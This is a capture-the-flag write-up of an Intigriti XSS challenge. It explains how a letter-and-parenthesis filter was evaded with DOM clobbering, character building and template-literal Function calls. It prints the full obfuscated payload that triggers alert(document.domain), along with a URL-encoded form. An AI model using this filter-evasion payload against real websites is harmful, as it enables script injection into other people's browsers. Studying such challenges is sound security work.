---
layout: single
title: Intigriti’s May XSS Challenge by @GrumpingouT
date: 2021-05-31
classes: wide
tags:
  - Intigriti
  - XSS
  - Challenge
  - GrumpingouT
---

How to execute XSS without letters, parenthesis and quotes? Read more to find out!

![share](/assets/images/intigriti/2021/05/share.jpg)

## Overview

The challenge itself is just a simple captcha program. The captcha contains a form which follows a certain naming pattern where each element has an ID of a single letter set alphabetically.

After a brief analysis, this small part catches my attention.

![vulnerable code](/assets/images/intigriti/2021/05/vulnerable-code.png)

It seems that this piece of code is most likely to be vulnerable. All I need to do is bypass the regular expression `/[a-df-z<>()!\\='"]/gi` to evaluate my code. Simple right? Well, not exactly...

An important note is that I cannot use any letters except “e”. This is tough since we need letters to do our `alert(document.domain)` payload.

However, this comment is is hinting something.

```
Allow letter 'e' because: https://en.wikipedia.org/wiki/E_(mathematical_constant)
```

## Solution

I went into the right direction and tried doing DOM clobbering? We have an element with the ID of ‘e’ which is allowed in the regular expression filter and could be used to build more characters following a well known technique called "Atomic XSS".

![dom clobbering](/assets/images/intigriti/2021/05/dom-clobbering.png)

Unfortunately, the program only evaluates once, which is enough to only decode the payload but not to execute it. I need to find a way to evaluate the code above after it has been decoded. I thought of one solution which is:

```
[]["flat"]["constructor"]("payload goes here")()
```

This proved quite hard since I need at least parenthesis to do this. Using grave accent symbols instead of parenthesis seems to work but not really.

```
[]["flat"]["constructor"]`payload goes here```
```

The problem here is that the payload shouldn’t be a string in order for this to work.

![string evaluation issue](/assets/images/intigriti/2021/05/string-evaluation-issue.png)

This was a major problem since most techniques required at least an equals sign to solve such a problem..

After a few hours messing around inside the devtools console, I managed to get “lucky”. I found two valid methods that solve this problem: `call` and `apply`

![string evaluation solution](/assets/images/intigriti/2021/05/string-evaluation-solution.png)

Now I have a few more literals to encode to get this working.

![preparing-payload](/assets/images/intigriti/2021/05/preparing-payload.png)

The full payload looks like this:

```
[][[e[0]+[]][0][4] + [e+[]][0][21] + [e*e+[]][0][1] + [e+[]][0][6]][[e+[]][0][5] + [e+[]][0][1] + [e+[]][0][25] + [e+[]][0][18] + [e+[]][0][6] + [e+[]][0][16] + [e[0]+[]][0][0] + [e+[]][0][5] + [e+[]][0][6] + [e+[]][0][1] + [e+[]][0][16]][[e+[]][0][5] + [e*e+[]][0][1] + [e+[]][0][21] + [e+[]][0][21]]`${[[e*e+[]][0][1] + [e+[]][0][21] + [e+[]][0][22] + [e+[]][0][16] + [e+[]][0][26] + [[][ [e[0]+[]][0][4] + [e+[]][0][21] + [e*e+[]][0][1] + [e+[]][0][26]]+[]][0][13] + [e[0]+[]][0][2] + [e+[]][0][1] + [e+[]][0][5] + [e[0]+[]][0][0] + [e+[]][0][23] + [e[0]+[]][0][3] + [e[0]+[]][0][1] + [e+[]][0][26] + [0.1+[]][0][1] + [e[0]+[]][0][2] + [e+[]][0][1] + [e+[]][0][23] + [e*e+[]][0][1] + [e[0]+[]][0][5] + [e[0]+[]][0][1] + [[][ [e[0]+[]][0][4] + [e+[]][0][21] + [e*e+[]][0][1] + [e+[]][0][26]]+[]][0][14]]}```
```

Lastly I need to remove the spaces and change the plus signs %2B in order to not mess up my payload when passed as a URL.

```
[][[e[0]%2Be][0][4]%2B[e%2Be][0][21]%2B[e*e%2Be][0][1]%2B[e%2Be][0][6]][[e%2Be][0][5]%2B[e%2Be][0][1]%2B[e%2Be][0][25]%2B[e%2Be][0][18]%2B[e%2Be][0][6]%2B[e%2Be][0][16]%2B[e[0]%2Be][0][0]%2B[e%2Be][0][5]%2B[e%2Be][0][6]%2B[e%2Be][0][1]%2B[e%2Be][0][16]][[e%2Be][0][5]%2B[e*e%2Be][0][1]%2B[e%2Be][0][21]%2B[e%2Be][0][21]]`${[[e*e%2Be][0][1]%2B[e%2Be][0][21]%2B[e%2Be][0][22]%2B[e%2Be][0][16]%2B[e%2Be][0][26]%2B[[][[e[0]%2Be][0][4]%2B[e%2Be][0][21]%2B[e*e%2Be][0][1]%2B[e%2Be][0][26]]%2Be][0][13]%2B[e[0]%2Be][0][2]%2B[e%2Be][0][1]%2B[e%2Be][0][5]%2B[e[0]%2Be][0][0]%2B[e%2Be][0][23]%2B[e[0]%2Be][0][3]%2B[e[0]%2Be][0][1]%2B[e%2Be][0][26]%2B[0.1%2Be][0][1]%2B[e[0]%2Be][0][2]%2B[e%2Be][0][1]%2B[e%2Be][0][23]%2B[e*e%2Be][0][1]%2B[e[0]%2Be][0][5]%2B[e[0]%2Be][0][1]%2B[[][[e[0]%2Be][0][4]%2B[e%2Be][0][21]%2B[e*e%2Be][0][1]%2B[e%2Be][0][26]]%2Be][0][14]]}```
```

Now I can paste the payload as a value to a query string parameter, for example `captcha.php?c=payload`.

Upon entering the URL, all I need is to click the submit button and the payload gets executed.

![alert](/assets/images/intigriti/2021/05/alert.png)

Thanks for reading!